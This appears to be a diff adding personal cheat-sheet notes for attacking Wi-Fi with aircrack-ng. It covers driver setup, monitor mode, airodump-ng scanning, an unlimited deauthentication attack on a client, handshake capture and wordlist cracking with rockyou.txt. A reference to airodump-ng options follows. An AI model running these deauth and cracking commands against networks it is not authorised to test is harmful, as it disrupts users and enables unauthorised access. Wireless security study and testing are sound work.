@@ -1,0 +1,196 @@
+////////////////////////////////////////////////////////////////////////////////
+					Install
+********************************************************************************
+
+lsusb (to check if there are devices)
+sudo apt-get
+sudo apt-upgrade -y
+sudo apt dist-upgrade -y
+sudo apt-get install realtek-rtl88xxau-dkms
+sudo apt-get install dkms
+git clone https://github.com/aircrack-ng/rtl8812au
+cd rtl8812au
+make
+sudo make install
+iwconfig => to see if there are network devices, should show as wlan0
+
+SHOW ERROR MESSAGES
+dmesg
+
+////////////////////////////////////////////////////////////////////////////////
+				Put in Monitor Mode
+********************************************************************************
+
+CONNECT THE USB IN THE VMWARE!!!!! Realtek802.11 NIC
+
+sudo airmon-ng start wlan0
+OR
+sudo iwconfig wlan0mon mode monitor channel 10
+OR
+
+Fern issue
+sudo ip link set wlan0 down
+sudo ip link set wlan0 name wlan0mon
+sudo iw dev wlan0mon set type monitor
+sudo ip link set wlan0mon up
+
+////////////////////////////////////////////////////////////////////////////////
+				Kill current processes
+********************************************************************************
+
+airmon-ng check kill
+
+////////////////////////////////////////////////////////////////////////////////
+					Scan
+********************************************************************************
+
+airodump-ng wlan0
+
+airodump-ng --band a wlan0 => to see 5ghz networks
+
+airodump-ng --band abg wlan0 => to see 2,4ghz AND 5ghz networks
+
+airodump-ng -w MYFILENAME --output-format csv wlan0
+
+airodump-ng wlan0 -d XX:XX:XX:XX:XX => to show specific AP
+
+airodump-ng -c 11 wlan0 => scan in a specific channel
+
+Retrieve client's mac address from selected AP
+
+airodump-ng -c 11 --bssid XX:XX:XX:XX:XX -w psk wlan0
+ie => airodump-ng -c 11 --bssid 28:87:BA:AC:07:E7 -w psk wlan0
+
+-c 9 = channel for the wireless network
+-bssid XX:XX:XX:XX:XX = mac addressof chosen ap
+-w psk = file name prefix for the file which will contains the IVS
+wlan0 = interface
+
+////////////////////////////////////////////////////////////////////////////////
+				Injection test
+********************************************************************************
+sudo aireplay-ng -9 wlan0
+o
+sudo aireplay-ng -test wlan0
+
+////////////////////////////////////////////////////////////////////////////////
+				Deauth attack
+********************************************************************************
+aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
+If we add -D at the end includes 5GHz networks
+
+sudo airodump-ng wlan0 --bssid 28:87:BA:AC:07:E7 --channel 2
+
+    The 0 represents an infinite amount of deauth attacks. If you wanted to only run 3 deauth attacks you’ll change this to 3.
+    -c is the client, what you’re attacking. This is the devices MAC address.
+    -a is the router, what is the router the victim is connected to.
+    wlan0mon is the name of the network card still in monitor mode.
+
+
+////////////////////////////////////////////////////////////////////////////////
+				Crack Password
+********************************************************************************
+
+aircrack-ng hack1-08.cap -w /usr/share/wordlists/rockyou.txt
+
+
+
+////////////////////////////////////////////////////////////////////////////////
+				   Commands 
+********************************************************************************
+usage: airodump-ng <options> <interface>[,<interface>,…]
+
+Options:
+–ivs: Save only captured IVs
+–gpsd: Use GPSd
+–write <prefix> : Dump file prefix
+-w: same as –write
+–beacons: Record all beacons in dump file
+–update <secs> : Display update delay in seconds
+–showack: Prints ack/cts/rts statistics
+-h: Hides known stations for –showack
+-f <msecs> : Time in ms between hopping channels
+–berlin <secs>: Time before removing the AP/client from the screen when no more packets are received (Default: 120 seconds)
+-r <file> : Read packets from that file
+-x <msecs> : Active Scanning Simulation
+–manufacturer: Display manufacturer from IEEE OUI list
+–uptime: Display AP Uptime from Beacon Timestamp
+–wps: Display WPS information (if any)
+
+–output-format
+
+<formats> : Output format. Possible values: pcap, ivs, csv, gps, kismet, netxml, logcsv
+–ignore-negative-one: Removes the message that says
+fixed channel <interface>: -1
+
+–write-interval
+
+<seconds> : Output file(s) write interval in seconds
+–background <enable> : Override background detection.
+
+Filter options:
+
+–encrypt <suite> : Filter APs by cipher suite
+–netmask <netmask> : Filter APs by mask
+–bssid <bssid> : Filter APs by BSSID
+–essid <essid> : Filter APs by ESSID
+–essid-regex <regex> : Filter APs by ESSID using a regular expression
+-a : Filter unassociated clients
+
+By default, airodump-ng hopps on 2.4 GHz channels. So you can record it in other channels using the options below:
+
+–ht20: Set channel to HT20 (802.11n)
+–ht40- : Set channel to HT40- (802.11n)
+–ht40+ : Set channel to HT40+ (802.11n)
+–channel <channels> : Capture on specific channels
+–band <abg> : Band on which airodump-ng should hop
+-C <frequencies>: Uses these frequencies in MHz to hop
+–cswitch <method> : Set channel switching method
+0: FIFO (default)
+1: Round Robin
+2: Hop on last
+-s: same as –cswitch
+
+–help : Displays this usage screen
+
+////////////////////////////////////////////////////////////////////////////////
+		What are the fields displayed when running Airodump-ng?
+********************************************************************************
+
+The first line shows the current channel, elapsed running time, current date, and optionally if a WPA/WPA2 handshake was detected. It should also be noted that “WPA handshake: 00:14:6C:7E:40:80” indicates that a WPA/WPA2 handshake was successfully captured for the BSSID. The following is an explanation of each of these fields:
+
+BSSID: MAC address of the access point. In the Client section, a BSSID of “(not associated)” means that the client is not associated with any AP.
+
+PWR: Signal level reported by the card.
+
+RXQ: Using this command, you can receive Quality as measured by the percentage of packets (management and data frames) successfully received over the last 10 seconds.
+
+Beacons: Number of announcements packets sent by the AP.
+
+# Data: Number of captured data packets, including data broadcast packets.
+
+#/s: Number of data packets per second measure over the last 10 seconds.
+
+CH: Channel number taken from beacon packets.
+
+MB: Maximum speed supported by the AP.
+
+ENC: Encryption algorithm in use.
+
+CIPHER: The cipher detected.
+
+AUTH: The authentication protocol used.
+
+ESSID: This shows the wireless network name.
+
+STATION: MAC address of each associated station searching for an AP to connect with.
+
+Rate: Station’s receive rate, followed by transmitting rate.
+
+Lost: The number of data packets lost over the last 10 seconds based on the sequence number.
+
+Packets: The number of data packets sent by the client.
+
+Notes: Additional information about the client, such as captured EAPOL or PMKID.
+
+Probes: These are the networks the client is trying to connect to if it is not currently connected.
